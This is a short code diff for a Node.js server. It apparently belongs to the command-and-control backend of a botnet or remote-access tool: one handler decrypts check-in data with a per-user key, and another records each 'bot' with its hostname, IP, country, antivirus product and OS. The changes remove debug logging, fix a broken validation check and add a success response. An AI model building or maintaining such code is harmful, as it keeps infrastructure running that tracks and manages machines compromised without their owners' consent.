@@ -20,7 +20,6 @@ exports.reportDecrypt = async (req, res, next) => {
         user = await database.getUser(id);
         if (user == null) {
             cache.set(id, "");
-            console.log("ttt");
             return res.sendStatus(400);
         }
     }
@@ -29,7 +28,6 @@ exports.reportDecrypt = async (req, res, next) => {
     try {
         decrypt = JSON.parse(crypto.decrypt(req.body, user.encryptedKey));
     } catch (e) {
-        console.log(e);
         return res.sendStatus(400);
     }
 
@@ -65,9 +63,10 @@ exports.reportPost = async (req, res) => {
         av = req.body.av,
         os = req.body.os;
     
-    if (typeof os == 'undefined' || os == '' || 'undefined' || ip == '' || typeof country == '' || country == '' || typeof hostname == '' || hostname == '' || typeof av == '' || av == '') {
+    if (typeof os == 'undefined' || os == '' || typeof ip == 'undefined' || ip == '' || typeof country == 'undefined' || country == '' || typeof hostname == 'undefined' || hostname == '' || typeof av == 'undefined' || av == '') {
         return res.sendStatus(400);
     }
 
     await database.addBot(user.username, hostname, ip, country, av, os);
+    return res.sendStatus(200);
 };
